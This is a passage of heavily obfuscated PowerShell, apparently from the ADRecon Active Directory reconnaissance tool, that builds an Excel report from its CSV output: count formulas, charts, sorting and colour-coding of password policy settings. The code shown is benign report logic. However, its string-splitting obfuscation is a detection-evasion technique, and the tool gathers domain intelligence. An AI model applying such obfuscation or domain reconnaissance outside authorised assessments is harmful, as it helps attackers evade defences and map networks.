            ${WoRKS`h`EET}."c`ELls".("{0}{1}" -f 'I','tem').Invoke(${R`ow}, ${cO`lU`mN}+1)."F`ORMuLA" = (((("{3}{1}{0}{2}" -f'IFS','NT','(liD','=COU')) -RePLace ([CHar]108+[CHar]105+[CHar]68),[CHar]39)) + ${srC`W`O`RKsheet}."N`Ame" + "'!" + ${ENAblED`Colad`DR`esS} + ((("{0}{1}{2}" -f',','{0}TRU','E{0},'))  -f[CHAR]34) + "'" + ${Src`worksH`eET}."nA`mE" + "'!" + ${C`olA`DDRESs} + ',' + ${O`BjA`T`TRi`Butes}[${_}] + ')'
            ${W`o`RksHeET}."ce`lls".("{0}{1}"-f 'I','tem').Invoke(${r`oW}, ${C`O`lumN}+2)."fOrMU`LA" = ((("{1}{2}{0}"-f'G','=IFE','RROR('))) + ${i} + (((("{3}{4}{5}{6}{1}{2}{0}"-f ',0)','R,A3',':B6,2,FALSE)','/VLO','OKUP(v','MREnabled','vM'))  -REPLACE  'vMR',[CHar]34))
            ${WoRk`SH`Eet}."c`eLLs".("{0}{1}"-f'Ite','m').Invoke(${R`ow}, ${c`oLumn}+3)."fOr`MulA" = (((("{2}{1}{0}{3}"-f 'NTIFS({0','U','=CO','}'))-F[ChaR]39)) + ${SRc`Wo`RKS`he`Et}."n`AMe" + "'!" + ${ENaBLe`Dco`ladDr`E`sS} + ((("{1}{0}{3}{4}{2}" -f'FALS',',DPn','n,','ED','P'))."rE`Pl`ACe"(([CHAR]68+[CHAR]80+[CHAR]110),[STrinG][CHAR]34)) + "'" + ${s`R`cwo`RKshEet}."Na`mE" + "'!" + ${c`OLAdD`ReSS} + ',' + ${OB`Jattr`Ib`UtEs}[${_}] + ')'
            ${W`Ork`sHEET}."c`ellS".("{1}{0}"-f'm','Ite').Invoke(${r`ow}, ${cO`l`UMn}+4)."fO`Rm`ULa" = ((("{1}{2}{3}{0}"-f 'I','=','IFERROR','('))) + ${I} + (((("{6}{7}{5}{2}{0}{3}{1}{4}{8}"-f 'd',',2,FALSE','e','{0},A3:B6',')','Disabl','/VLOOKU','P({0}',',0)'))-F[ChaR]34))
            If ( (${_} -eq ("{0}{2}{1}{3}" -f 'SIDHi','r','sto','y')) -or (${_} -eq ("{1}{4}{2}{3}{0}"-f'd','ms-d','at','orSi','s-Cre')) )
            {
                
                ${wo`Rk`shEeT}."c`eLls".("{1}{0}" -f'em','It').Invoke(${R`oW}, ${C`olU`MN}+5)."fo`RMULA" = (((("{3}{0}{1}{2}" -f'IF','(oF','4','=COUNT'))  -RePLace  'oF4',[cHAr]39)) + ${sRCWOrk`S`H`e`ET}."na`ME" + "'!" + ${c`ola`DDr`esS} + ',' + ${OBJ`ATTrIbU`TEs}[${_}] + ')-1'
            }
            Else
            {
                ${W`Ork`shEeT}."cEl`ls".("{0}{1}"-f'I','tem').Invoke(${r`ow}, ${COlU`MN}+5)."fo`RMu`LA" = (((("{2}{0}{1}" -f 'NTI','F({0}','=COU'))  -f[cHAR]39)) + ${S`Rcwor`ksH`eeT}."N`Ame" + "'!" + ${CO`L`AdDREss} + ',' + ${oBJa`Tt`RIB`UtES}[${_}] + ')'
            }
            ${wo`RKS`HEEt}."c`EllS".("{0}{1}"-f'I','tem').Invoke(${R`ow}, ${COL`UMN}+6)."fOrmU`LA" = ((("{1}{2}{0}"-f'R(K','=IFERR','O'))) + ${i} + ((("{5}{8}{1}{7}{6}{3}{4}{2}{0}" -f ',0)','LOOK',')',':B6,2,FALS','E','/','alXk0,A3','UP(Xk0Tot','V'))."r`epl`Ace"(([cHAR]88+[cHAR]107+[cHAR]48),[STRiNG][cHAR]34))
        }

        
        "H", "J" , "L" | &("{3}{0}{1}{2}"-f'rEach','-Obje','ct','Fo') {
            ${R`NG} = ${_} + $(${R`Ow} - ${obJ`ATtr`iBUt`eS}."c`ounT" + 1) + ":" + ${_} + $(${r`oW})
            ${W`orKs`HEEt}.("{0}{1}"-f 'Rang','e').Invoke(${r`Ng})."nuMberF`O`RMAT" = ("{0}{1}" -f'0.','00%')
        }
    }
    ${EX`C`EL}."SCreen`UpDa`TING" = ${T`Rue}

    &("{0}{5}{3}{2}{4}{1}" -f'Ge','se','jRe','Ob','lea','t-ADRExcelCom') -ComObjtoRelease ${Sr`C`worksHeet}
    &("{1}{2}{0}"-f 'able','Remove-V','ari') ("{0}{3}{2}{1}" -f'Sr','rksheet','Wo','c')
    &("{3}{0}{4}{2}{1}" -f 't-ADR','bjRelease','xcelComO','Ge','E') -ComObjtoRelease ${WOR`ks`hEET}
    &("{1}{0}{2}{3}" -f 'move-Var','Re','ia','ble') ("{0}{2}{1}"-f 'wo','ksheet','r')
}

Function G`E`T-a`drE`x`cELChart
{

    param (
        [Parameter(mANdATory = ${t`RUE})]
        [string] ${cH`ArTTy`Pe},

        [Parameter(mANDaToRy = ${t`RuE})]
        [int] ${C`haRt`laYOuT},

        [Parameter(MandatOry = ${t`RUe})]
        [string] ${c`HAR`TTitLE},

        [Parameter(MaNDaTory = ${T`RuE})]
        ${R`AN`GeT`ocOV`er},

        [Parameter(maNDATorY = ${Fa`lSE})]
        ${cH`AR`Td`AtA} = ${n`UlL},

        [Parameter(maNDaTORy = ${fal`SE})]
        ${stART`R`OW} = ${nU`ll},

        [Parameter(MAndAtoRy = ${F`A`lSE})]
        ${sTaRtC`olU`MN} = ${nu`LL}
    )

    ${EXC`EL}."S`Cre`e`N`UpdatIng" = ${F`A`lse}
    ${eXC`el}."d`ISpl`AyALerTS" = ${FA`L`se}
    ${WO`RKS`hE`Et} = ${w`or`KbooK}."W`OrksHeE`Ts".("{1}{0}" -f'tem','I').Invoke(1)
    ${ch`ART} = ${woRks`He`et}."s`Hap`Es".("{2}{0}{1}"-f'h','art','AddC').Invoke()."c`hARt"
    
    ${c`h`ARt}."C`Ha`RTTy`Pe" = [int]( $jkI62::${CH`AR`Ttype})
    ${ch`Art}.("{3}{2}{0}{1}" -f'L','ayout','ply','Ap').Invoke(${c`haRt`LayOUT})
    If (${N`Ull} -eq ${cH`Art`DATA})
    {
        If (${Nu`Ll} -eq ${sT`ARt`RoW})
        {
            ${STA`Rt} = ${wo`RKS`h`EET}.("{0}{1}" -f'R','ange').Invoke("A1")
        }
        Else
        {
            ${STA`RT} = ${W`or`kSHEEt}.("{1}{0}" -f'ange','R').Invoke(${ST`Ar`TR`oW})
        }
        
        ${x} = ${WO`RkS`HE`eT}."RA`NGe"(${S`TArt},${S`Tart}."e`Nd"(  (  GeT-iTEM vaRIABle:W2IvSD).vaLUE::"XLD`OwN"))
        If (${N`ULL} -eq ${StaR`TcOL`U`Mn})
        {
            ${S`TA`RT} = ${W`O`RKshEet}.("{0}{1}"-f'Ran','ge').Invoke("B1")
        }
        Else
        {
            ${s`T`ARt} = ${Worksh`E`Et}.("{0}{1}"-f 'Rang','e').Invoke(${s`TArtcol`U`Mn})
        }
        
        ${Y} = ${w`OrKs`he`et}."R`AnGe"(${St`ARt},${stA`RT}."E`Nd"(  (DIr  VArIABle:w2ivsd  ).valUE::"Xld`OWN"))
        ${C`HA`RT`DATa} = ${W`oR`ksheET}.("{1}{0}" -f'ge','Ran').Invoke(${X},${Y})

        &("{3}{5}{2}{6}{4}{1}{0}{7}" -f'jRel','omOb','-ADRE','G','lC','et','xce','ease') -ComObjtoRelease ${x}
        &("{4}{3}{2}{0}{1}"-f'v','e-Variable','o','m','Re') ('X')
        &("{6}{0}{1}{2}{5}{3}{7}{4}" -f'DREx','cel','C','jR','lease','omOb','Get-A','e') -ComObjtoRelease ${Y}
        &("{0}{3}{1}{2}"-f 'Rem','i','able','ove-Var') ('Y')
        &("{3}{4}{2}{1}{0}{6}{5}" -f'DR','A','-','G','et','Release','ExcelComObj') -ComObjtoRelease ${s`TArT}
        &("{0}{1}{2}" -f 'Remov','e','-Variable') ("{0}{1}" -f's','tart')
    }
    ${C`hARt}.("{2}{3}{1}{0}"-f'ta','Da','SetS','ource').Invoke(${ch`A`RTD`ATA})
    
    ${ChA`Rt}."p`LoTBy" =  (get-chilDiTeM ("vaRi"+"ABLE"+":"+"25u") ).VaLuE::"xlc`O`LuMns"
    ${CH`A`RT}.("{2}{0}{1}"-f 'eriesCollectio','n','s').Invoke(1).("{1}{0}"-f 'ct','Sele').Invoke() | &("{1}{2}{0}" -f'll','Out-','Nu')
    ${cH`A`RT}.("{1}{0}{3}{2}{4}" -f 'ie','Ser','tio','sCollec','n').Invoke(1).("{1}{3}{2}{0}" -f 'ls','Apply','ataLabe','D').Invoke() | &("{0}{2}{1}" -f 'out-','ll','Nu')
    
    ${c`HaRt}."h`AsTItLe" = ${Tr`Ue}
    ${c`HaRT}."cHaR`T`Ti`TlE"."te`XT" = ${chA`RTTI`TlE}
    
    ${T`emp} = ${wO`Rksh`eeT}.("{0}{1}"-f 'Ra','nge').Invoke(${ra`NGE`To`COVER})
    
    ${C`h`ART}."pA`ReNT"."t`oP" = ${t`EMp}."t`Op"
    ${c`hART}."p`AR`Ent"."le`Ft" = ${tE`MP}."l`eft"
    ${cH`ART}."pAR`ENt"."wi`DTH" = ${t`eMp}."Wi`dtH"
    If (${C`HA`RTTIt`lE} -ne ("{6}{2}{5}{4}{1}{0}{3}{7}"-f'rou','G','i','ps in A','ed ','leg','Priv','D'))
    {
        ${C`hA`Rt}."P`ARENT"."hEiG`HT" = ${t`emP}."h`EIGht"
    }
    
    ${E`xCeL}."Sc`ReENuP`d`AtInG" = ${t`RUE}
    ${E`XCEL}."DiS`p`laY`Al`ertS" = ${tr`UE}

    &("{5}{3}{2}{4}{0}{1}{6}" -f'jR','ele','elC','ADRExc','omOb','Get-','ase') -ComObjtoRelease ${C`ha`RT}
    &("{3}{2}{1}{0}"-f'able','Vari','e-','Remov') ("{0}{1}"-f 'cha','rt')
    &("{0}{2}{4}{5}{1}{3}" -f'Get','leas','-ADREx','e','celComObjR','e') -ComObjtoRelease ${CHaRt`d`ATA}
    &("{1}{2}{0}{3}" -f 'Variabl','Rem','ove-','e') ("{2}{1}{0}" -f'ta','hartDa','C')
    &("{6}{1}{5}{2}{0}{4}{7}{3}"-f'ObjRel','RExc','Com','e','ea','el','Get-AD','s') -ComObjtoRelease ${t`EMP}
    &("{1}{2}{3}{0}"-f 'e','Rem','ove-Varia','bl') ("{1}{0}"-f 'mp','te')
    &("{3}{1}{2}{5}{4}{0}{6}{7}"-f'l','t-ADRExc','e','Ge','omObjRe','lC','ea','se') -ComObjtoRelease ${WORKsH`E`ET}
    &("{0}{1}{3}{2}" -f'Remove-V','a','ble','ria') ("{1}{0}" -f 'et','workshe')
}

Function G`eT-aDre`X`cE`LSo`RT
{

    param (
        [Parameter(MANDaToRY = ${T`RuE})]
        [string] ${c`OLUM`N`NAme}
    )

    ${W`OrKS`HEeT} = ${W`o`RkB`OOK}."worKs`hE`etS".("{1}{0}"-f 'em','It').Invoke(1)
    ${wOrKS`H`E`et}.("{2}{1}{0}"-f'te','a','Activ').Invoke();

    ${e`Xce`LcOlu`Mn} = (${w`O`RKShEET}."C`oLUm`NS".("{0}{1}" -f'F','ind').Invoke(${CoL`UMnn`A`mE}))
    If (${ex`CeLcol`U`mn})
    {
        If (${E`XCElc`OLumN}."Te`xT" -ne ${C`OlUMnNa`Me})
        {
            ${Be`GiNaDD`RESs} = ${ex`c`elColu`MN}.("{1}{2}{0}" -f 'ess','Add','r').Invoke(0,0,1,1)
            ${e`ND} = ${F`Alse}
            Do {
                
                ${Ex`c`el`ColuMN} = (${woRKSH`e`Et}."C`olUMnS".("{0}{1}{2}"-f 'Fin','d','Next').Invoke(${ex`c`EL`COLUMN}))
                ${a`DDr`ess} = ${ex`Ce`LcoLumn}.("{2}{1}{0}"-f'ss','re','Add').Invoke(0,0,1,1)
                If ( (${aDD`ReSs} -eq ${B`eg`in`A`dDrEss}) -or (${exceLc`o`luMn}."Te`Xt" -eq ${CoLuMN`NA`Me}) )
                {
                    ${e`Nd} = ${Tr`UE}
                }
            } Until (${e`Nd} -eq ${T`Rue})
        }
        If (${Ex`ceLcOL`UmN}."TE`XT" -eq ${cOLu`MN`NAMe})
        {
            
            ${woRkSh`E`Et}."LIS`ToBjec`Ts".("{1}{0}"-f'tem','I').Invoke(1)."S`ort"."S`ORTFi`Elds".("{1}{0}"-f 'ar','Cle').Invoke()
            ${wo`RKsH`eET}."LISTO`B`je`CTS".("{0}{1}" -f'It','em').Invoke(1)."so`RT"."SOR`TfIeL`dS".("{1}{0}"-f'dd','A').Invoke(${ExcE`lCOl`UMN}) | &("{2}{1}{0}" -f'Null','t-','Ou')
            ${w`O`R`ksHEet}."lI`S`Tobje`ctS".("{1}{0}"-f'em','It').Invoke(1)."S`ort".("{1}{0}"-f 'pply','A').Invoke()
        }
        Else
        {
            &("{0}{3}{1}{2}" -f 'Wri','-Verb','ose','te') "[Get-ADRExcelSort] $($ColumnName) not found in the $($worksheet.Name) worksheet. "
        }
    }
    Else
    {
        &("{1}{2}{3}{0}" -f'bose','W','rite','-Ver') "[Get-ADRExcelSort] $($ColumnName) not found in the $($worksheet.Name) worksheet. "
    }
    &("{0}{3}{4}{2}{5}{1}{6}"-f 'Get','bj','om','-ADRE','xcelC','O','Release') -ComObjtoRelease ${WoR`Kshe`eT}
    &("{3}{1}{2}{0}" -f 'e','V','ariabl','Remove-') ("{1}{0}{2}"-f'orksh','w','eet')
}

Function eXp`ort-aDR`EXCEl
{

    param(
        [Parameter(MandATOrY = ${TR`UE})]
        [string] ${e`x`cE`lPath},

        [Parameter(MAndatORy = ${F`A`LSe})]
        [string] ${L`oGO} = ("{1}{0}"-f 'DRecon','A')
    )

    If (${P`Sv`ersiont`A`BLe}."pSe`dIt`IOn" -eq ("{1}{0}" -f 're','Co'))
    {
        If (${ps`VERsIOn`Tab`LE}."p`l`AtForM" -eq ("{0}{1}"-f 'Win','32NT'))
        {
            ${ReT`U`RNDIr} = &("{3}{2}{1}{0}"-f'on','i','t','Get-Loca')
            &("{1}{2}{0}" -f 'cation','Se','t-Lo') ((("{1}{2}{4}{5}{3}{0}"-f'yeMX','C',':eMXWi','MXassembl','ndo','wse'))  -ReplACE  ([CHaR]101+[CHaR]77+[CHaR]88),[CHaR]92)
            ${REffOl`D`er} = (&("{1}{0}{3}{2}{4}" -f'-Chil','Get','t','dI','em') -Recurse  ("{5}{3}{4}{0}{6}{1}{2}"-f 'fice.Interop','l.d','ll','osoft.','Of','Micr','.Exce'))."diR`e`cTOry"
            &("{2}{0}{3}{1}"-f 'et-Lo','n','S','catio') ${reff`o`ldeR}
            &("{2}{1}{0}"-f 'ype','-T','Add') -AssemblyName ("{2}{1}{4}{0}{5}{3}"-f'fice.Interop','so','Micro','Excel','ft.Of','.')
            &("{0}{3}{1}{2}" -f'Set-','io','n','Locat') ${R`E`TURNdiR}
            &("{0}{3}{1}{2}"-f'R','ove','-Variable','em') ("{2}{0}{1}"-f'ndi','r','retur')
            &("{0}{1}{4}{2}{3}"-f'R','emove','i','able','-Var') ("{3}{1}{0}{2}" -f 'Fold','f','er','re')
        }
    }

    ${EX`CEl`Path} = $((&("{1}{0}{2}"-f't-','Conver','Path') ${exCE`lPA`Th}).("{1}{0}"-f 'mEnd','Tri').Invoke("\"))
    ${r`EPoRTPa`Th} = -join(${ExcE`l`path},'\',("{0}{2}{1}"-f'C','les','SV-Fi'))
    If (!(&("{0}{1}{2}"-f 'T','est','-Path') ${rePort`Pa`TH}))
    {
        &("{0}{2}{1}"-f 'Write-W','ing','arn') ("{13}{1}{14}{10}{12}{20}{5}{4}{17}{15}{3}{19}{7}{9}{18}{8}{2}{16}{6}{0}{11}" -f'xiti','Ex',' .','he',' lo','] Could not','E','CSV-','ctory','File','-A','ng','DR','[','port','e t','.. ','cat','s dire',' ','Excel')
        &("{2}{1}{0}{3}"-f'i','r','W','te-Verbose') "[EXCEPTION] $($_.Exception.Message) "
        Return ${NU`lL}
    }
    &("{0}{3}{5}{2}{4}{1}"-f 'Get','mObj','Exc','-','elCo','ADR')
    If (${eX`CEl})
    {
        &("{0}{1}{3}{2}"-f'Wr','it','tput','e-Ou') ("{2}{7}{4}{5}{0}{6}{8}{1}{3}" -f'ng','t.xl','[','sx','] Ge','nerati',' ADRecon-Repo','*','r')

        ${aD`FiLE`N`Ame} = -join(${REPor`T`pA`TH},'\',("{2}{1}{0}{3}"-f'con','outADRe','Ab','.csv'))
        If (&("{2}{0}{1}" -f '-','Path','Test') ${aDF`iLenA`me})
        {
            &("{2}{0}{5}{1}{3}{4}" -f 'ADREx','elI','Get-','mpor','t','c') -ADFileName ${ad`FiLEnA`mE}
            &("{3}{2}{0}{1}"-f 'Variabl','e','emove-','R') ("{3}{1}{0}{2}"-f'a','ileN','me','ADF')

            ${WO`RKB`OOk}."w`oR`KsHEeTS".("{0}{1}" -f'It','em').Invoke(1)."na`mE" = ("{0}{2}{1}"-f'Ab','on','out ADRec')
            ${wo`RK`Book}."Wo`Rk`shE`eTS".("{1}{0}" -f'em','It').Invoke(1)."hyp`eR`LinKS".("{1}{0}" -f'd','Ad').Invoke(${w`orkBo`OK}."Wo`RKShE`ETS".("{1}{0}"-f'em','It').Invoke(1)."C`ElLs".("{0}{1}" -f 'I','tem').Invoke(3,2) , ("{1}{4}{6}{3}{2}{5}{8}{7}{0}"-f'con','h','co','om/adre','ttps://','n','github.c','DRe','/A'), "" , "", ("{0}{4}{2}{1}{3}{5}" -f'github.com/','n/A','eco','DReco','adr','n')) | &("{2}{1}{0}" -f'ull','N','Out-')
            ${wo`RKbo`ok}."WOR`kSHe`eTs".("{1}{0}"-f 'm','Ite').Invoke(1)."u`S`eDrANgE"."eNtIR`ecO`lumn".("{1}{2}{0}" -f 'oFit','Au','t').Invoke() | &("{1}{0}" -f'l','Out-Nul')
        }

        ${A`DF`Ilen`AmE} = -join(${rEP`o`RtP`Ath},'\',("{2}{0}{1}"-f'orest.c','sv','F'))
        If (&("{2}{1}{0}" -f'Path','t-','Tes') ${AdfIl`En`A`Me})
        {
            &("{3}{0}{2}{1}"-f'elW','book','ork','Get-ADRExc') -Name ("{1}{0}" -f'st','Fore')
            &("{2}{4}{5}{3}{0}{1}"-f 'por','t','G','elIm','et','-ADRExc') -ADFileName ${Adf`i`leNA`Me}
            &("{0}{1}{2}"-f 'Remov','e-Variab','le') ("{2}{0}{1}" -f'ileNam','e','ADF')
        }

        ${a`dFi`leNamE} = -join(${r`EP`ORTP`AtH},'\',("{2}{0}{1}"-f'in.c','sv','Doma'))
        If (&("{1}{0}" -f '-Path','Test') ${aDF`iL`en`AME})
        {
            &("{3}{2}{1}{0}" -f'kbook','ExcelWor','t-ADR','Ge') -Name ("{0}{1}" -f 'Dom','ain')
            &("{1}{4}{0}{2}{3}"-f'ADR','Get','ExcelImp','ort','-') -ADFileName ${A`dfI`LeNaME}
            ${doM`A`InoBJ} = &("{0}{1}{2}{3}" -f'Import-','C','S','V') -Path ${A`df`i`lEnamE}
            &("{1}{3}{0}{2}" -f '-Varia','Re','ble','move') ("{2}{0}{1}"-f'ile','Name','ADF')
            ${DoMA`iNn`AME} = -join(${doMA`In`obJ}[0]."VA`lUE","-")
            &("{0}{2}{1}{3}" -f 'R','ve-Var','emo','iable') ("{2}{1}{0}"-f'inObj','oma','D')
        }

        ${ad`F`iLEN`AMe} = -join(${re`PO`RT`Path},'\',("{2}{0}{1}"-f's','.csv','Trust'))
        If (&("{2}{0}{1}"-f'est-','Path','T') ${AdFiLe`N`Ame})
        {
            &("{5}{4}{3}{1}{0}{2}" -f 'kboo','ExcelWor','k','R','AD','Get-') -Name ("{0}{1}"-f'Trust','s')
            &("{3}{1}{2}{0}" -f 'ort','et-ADRExcelIm','p','G') -ADFileName ${a`D`FI`lenAmE}
            &("{2}{1}{0}" -f 'ariable','move-V','Re') ("{2}{1}{0}" -f 'me','FileNa','AD')
        }

        ${adFI`LEnA`me} = -join(${Re`PoRtP`A`TH},'\',("{0}{2}{1}" -f'Su','v','bnets.cs'))
        If (&("{2}{0}{1}" -f '-Pa','th','Test') ${ADFI`LEn`A`mE})
        {
            &("{4}{2}{1}{3}{0}" -f 'k','celW','ADREx','orkboo','Get-') -Name ("{0}{1}" -f'Sub','nets')
            &("{2}{3}{0}{1}" -f'E','xcelImport','Get','-ADR') -ADFileName ${Ad`FIL`Ena`Me}
            &("{3}{0}{4}{1}{2}"-f 'e','ariab','le','Remov','-V') ("{1}{0}{3}{2}"-f 'D','A','ileName','F')
        }

        ${a`dF`IlEnAmE} = -join(${re`PoRt`PaTh},'\',("{0}{3}{1}{2}" -f'S','c','sv','ites.'))
        If (&("{0}{2}{1}" -f'Te','h','st-Pat') ${A`DfiLE`NAMe})
        {
            &("{5}{2}{3}{4}{0}{1}{6}" -f'rk','bo','c','el','Wo','Get-ADREx','ok') -Name ("{1}{0}" -f 'tes','Si')
            &("{2}{0}{3}{1}{4}"-f 'et-ADRE','Im','G','xcel','port') -ADFileName ${A`dfi`leNAME}
            &("{1}{0}{2}" -f 'bl','Remove-Varia','e') ("{1}{0}{2}"-f 'm','ADFileNa','e')
        }

        ${AdF`ilE`NAme} = -join(${rep`ORt`patH},'\',("{0}{4}{1}{2}{3}" -f'S','m','aHis','tory.csv','che'))
        If (&("{2}{0}{1}"-f 'st-Pa','th','Te') ${A`DfIl`En`Ame})
        {
            &("{0}{2}{1}{3}"-f'Get-A','kboo','DRExcelWor','k') -Name ("{3}{2}{0}{1}{4}" -f'H','istor','hema','Sc','y')
            &("{2}{1}{4}{0}{3}"-f'RExcel','t-','Ge','Import','AD') -ADFileName ${AdFiLE`N`AMe}
            &("{3}{1}{0}{2}"-f 've-Variabl','mo','e','Re') ("{2}{1}{0}"-f 'me','Na','ADFile')
        }

        ${adf`I`LENAME} = -join(${re`POrTPa`Th},'\',("{6}{3}{4}{0}{5}{2}{1}{7}" -f'ed','swordP','s','eGra','in','Pa','Fin','olicy.csv'))
        If (&("{1}{0}{2}" -f't','Tes','-Path') ${A`DFIl`ENAMe})
        {
            &("{2}{4}{3}{0}{1}" -f'orkb','ook','Ge','xcelW','t-ADRE') -Name ("{1}{0}{3}{4}{2}"-f 'e Gr','Fin','Policy','a','ined Password ')
            &("{3}{0}{1}{4}{2}" -f'et-A','D','xcelImport','G','RE') -ADFileName ${ADf`i`L`enAmE} -Method 3
            &("{3}{0}{4}{1}{2}" -f 'o','e-Variab','le','Rem','v') ("{3}{1}{2}{0}"-f'eName','i','l','ADF')

            ${wORk`SH`eeT} = ${W`oRKbOoK}."WOrKsH`ee`Ts".("{0}{1}"-f'I','tem').Invoke(1)
            ${UsEd`RA`NGE} = ${wo`RKSh`EeT}."us`EdR`AnGe"

            ${usE`dRaN`Ge}.("{0}{1}" -f 'Row','s').Invoke(2)."wR`APTexT" = ${Tr`UE}

            ${useDrA`N`GE}."CoL`UM`Ns" | &("{0}{4}{3}{2}{1}"-f'ForE','ect','j','h-Ob','ac') {
                ${_}."C`O`lumNWiDtH" = 60
            }
            ${uS`E`dRan`Ge}.("{0}{1}"-f 'Row','s').Invoke(2).("{1}{2}{0}"-f 'Fit','Aut','o').Invoke() | &("{1}{2}{0}"-f 'l','Out','-Nul')
            ${us`EDR`AnGe}."coL`U`MNS"["A"].("{0}{1}{2}"-f 'Au','toFi','t').Invoke() | &("{2}{1}{0}"-f'Null','ut-','O')
        }

        ${Ad`FIleNa`ME} = -join(${r`EporT`pa`TH},'\',("{2}{1}{3}{4}{0}"-f '.csv','efau','D','ltPasswo','rdPolicy'))
        If (&("{1}{0}{2}"-f'Pa','Test-','th') ${a`D`FIl`eNAME})
        {
            &("{2}{1}{0}{4}{3}" -f 'DRExc','A','Get-','orkbook','elW') -Name ("{2}{3}{5}{0}{1}{4}" -f 'ss','word Polic','De','fault ','y','Pa')
            &("{2}{0}{3}{1}" -f 'elIm','t','Get-ADRExc','por') -ADFileName ${Ad`FILeNa`Me}
            &("{0}{4}{2}{1}{3}"-f 'Re','ria','a','ble','move-V') ("{1}{2}{0}" -f'Name','A','DFile')

            ${e`xceL}."ScRE`ENupd`A`TiNg" = ${F`A`Lse}
            ${Wor`KsH`E`eT} = ${W`oRkbo`oK}."WO`Rk`SHEets".("{1}{0}"-f'm','Ite').Invoke(1)

            
            ${Wo`RKSHE`Et}.("{1}{0}" -f 'e','Rang').Invoke(("{1}{0}"-f'D1','C1:'))."H`or`IZontA`l`ALign`MEnt" = -4108
            ${w`ORkBOOk}."W`O`Rk`SheeTS".("{0}{1}"-f'I','tem').Invoke(1)."ce`llS".("{0}{1}" -f'I','tem').Invoke(1,7)."H`o`RIZo`Nt`ALalign`MEnT" = -4108
            ${wo`RKsHE`et}.("{1}{0}"-f 'nge','Ra').Invoke(("{1}{0}"-f'2:H10','B'))."H`or`IZoNtAl`A`LIgNMenT" = -4108

            

            ("{1}{0}{2}" -f 'B','A2:','10'), ("{1}{0}"-f'0','C2:E1'), ("{0}{1}" -f'F2:G','10'), ("{0}{1}"-f 'H2',':H10') | &("{3}{1}{0}{2}{4}"-f 'b','-O','j','ForEach','ect') {
                ${W`O`RkSHE`ET}.("{0}{1}" -f'R','ange').Invoke(${_}).("{2}{3}{0}{1}"-f 'r','Around','Bor','de').Invoke(1) | &("{1}{0}{2}"-f't-N','Ou','ull')
            }

            
            
            
            

            ${O`BjvAL`Ues} = @(
            
            "C2", (("{6}{5}{2}{3}{4}{0}{1}" -f ' FA','LSE)','<4',',TRUE',',','(B2','=IF'))

            
            "C3", (("{4}{1}{5}{2}{0}{3}" -f 'B3>90),TRUE, F','(OR','B3=0,','ALSE)','=IF','('))

            

            
            "C5", ("{0}{2}{4}{3}{1}"-f'=IF(B5<7,TRUE,',')',' FA','SE','L')

            
            "C6", (("{4}{1}{5}{3}{0}{2}"-f ',','>',' FALSE)','RUE,TRUE','=IF(B6<','T'))

            

            
            "C8", (("{0}{6}{2}{5}{7}{4}{3}{1}"-f '=IF','FALSE)','D(',',TRUE, ',',B8<30)','B8>=','(AN','1'))

            
            "C9", ("{3}{0}{1}{4}{5}{2}"-f 'F(OR(B','9=','LSE)','=I','0',',B9>6),TRUE, FA')

            

            
            "D2", (("{2}{3}{4}{0}{1}" -f'ALSE',')','=IF(','B2<4,TRUE,',' F'))

            
            "D3", ((("{7}{9}{6}{4}{5}{2}{3}{0}{8}{1}" -f'RUE, F','LSE)',',B3>9','0),T','B','3=0','(','=','A','IF(OR')))

            

            
            "D5", ("{3}{0}{4}{1}{2}"-f'IF(B5<',',TRUE',', FALSE)','=','12')

            
            "D6", (("{3}{6}{5}{1}{4}{2}{0}" -f'E,TRUE, FALSE)','6<','RU','=','>T','(B','IF'))

            

            
            "D8", (("{1}{5}{2}{4}{7}{3}{0}{6}"-f '),TRU','=','AND','0','(B8>=1,B','IF(','E, FALSE)','8<3'))

            
            "D9", (("{1}{3}{5}{4}{0}{2}"-f' FAL','=I','SE)','F(OR','0,B9>10),TRUE,','(B9='))

            

            
            

            
            "F3", ("{2}{0}{8}{7}{3}{6}{4}{5}{1}{9}" -f'(','SE','=IF','>365),T',', ','FAL','RUE','(B3=0,B3','OR',')')

            
            

            
            "F5", (("{0}{6}{4}{1}{3}{5}{2}" -f'=IF','F','E)','A','<14,TRUE, ','LS','(B5'))

            
            

            

            

            
            "F9", ("{3}{8}{6}{5}{0}{1}{4}{7}{2}{9}"-f ',T','RUE','S','=IF(',', FA',',B9>5)','0','L','OR(B9=','E)')

            

            
            "H2", ("{0}{6}{4}{3}{5}{2}{1}" -f'=IF(B2<24',')','E','UE, F','R','ALS',',T')

            
            "H3", (("{4}{3}{5}{0}{2}{7}{1}{6}" -f'5),T','A','RU','(','=IF(OR','B3=0,B3>36','LSE)','E, F'))

            
            "H4", ("{0}{3}{1}{4}{2}" -f '=','F(B4=0,T','ALSE)','I','RUE, F')

            
            "H5", ("{0}{1}{3}{2}{4}{5}" -f'=IF','(B5<14,TR','E,','U',' FAL','SE)')

            
            "H6", ("{6}{4}{1}{5}{2}{7}{0}{3}" -f 'LS','(B','>TRU','E)','F','6<','=I','E,TRUE, FA')

            
            "H7", ("{1}{0}{3}{6}{7}{5}{4}{2}" -f '(B7','=IF','SE)','<>FALSE,','AL',', F','TRU','E')

            
            "H8", ((("{3}{5}{6}{2}{1}{4}{0}" -f'LSE)',')','15','=IF(AND',',TRUE, FA','(B8>=1,B','8<')))

            
            "H9", (("{2}{1}{0}{3}{4}{5}" -f'9>5)','B','=IF(OR(B9=0,',',TR','UE',', FALSE)'))

            
            "H10", ("{3}{2}{1}{0}{4}" -f'RUE, F','0<15,T','1','=IF(B','ALSE)') )

            For (${i} = 0; ${I} -lt $(${OB`jV`Alu`eS}."c`OuNT"); ${i}++)
            {
                ${WORksH`e`ET}."r`AngE"(${Obj`VALU`es}[${i}])."FORMAT`Co`Ndi`T`iONs"."A`dD"(  $0C1x9::"XLExpr`EsSi`on", 0, ${oB`jvALU`Es}[${I}+1]) | &("{2}{1}{0}" -f 'll','-Nu','Out')
                ${i}++
            }

            "C2", "C3" , "C5", "C6", "C8", "C9", "D2", "D3" , "D5", "D6", "D8", "D9", "F5", "F9", "H2", "H3", "H4", "H5", "H6", "H7", "H8", "H9", "H10" | &("{0}{2}{1}"-f 'F','ct','orEach-Obje') {
                ${w`OrKSH`EET}.("{0}{1}"-f 'R','ange').Invoke(${_})."f`or`MATCo`N`DiTioNs".("{1}{0}" -f'tem','I').Invoke(1)."S`To`PI`FTrUe" = ${F`ALSe}
                ${wor`KShe`ET}.("{1}{0}" -f 'ge','Ran').Invoke(${_})."F`oRMAtcoND`itI`OnS".("{0}{1}" -f 'Ite','m').Invoke(1)."F`ONt"."C`Olo`RiNdEX" = 3
            }

